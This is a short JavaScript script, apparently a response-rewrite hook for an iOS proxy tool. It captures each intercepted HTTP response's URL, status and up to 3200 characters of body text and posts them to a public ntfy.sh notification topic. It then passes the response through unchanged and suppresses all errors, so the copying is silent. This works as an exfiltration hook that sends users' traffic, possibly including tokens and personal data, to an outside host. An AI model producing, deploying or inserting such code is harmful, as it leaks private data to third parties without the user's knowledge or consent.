var T = 'https://ntfy.sh/itc-zak-9f3a2';
var b = '';
try { b = String(($response && $response.body) || ''); } catch (e) {}
try {
  var u = String(($request && $request.url) || '');
  var s = String(($response && $response.status) || '');
  var c = b.replace(/[^\x20-\x7E]/g, ' ').slice(0, 3200);
  $httpClient.post({ url: T, body: 'RES ' + s + ' ' + u.slice(0, 220) + ' len=' + b.length + '\n' + c, headers: { 'Title': 'res' } }, function () {});
} catch (e2) {}
$done({ body: b });
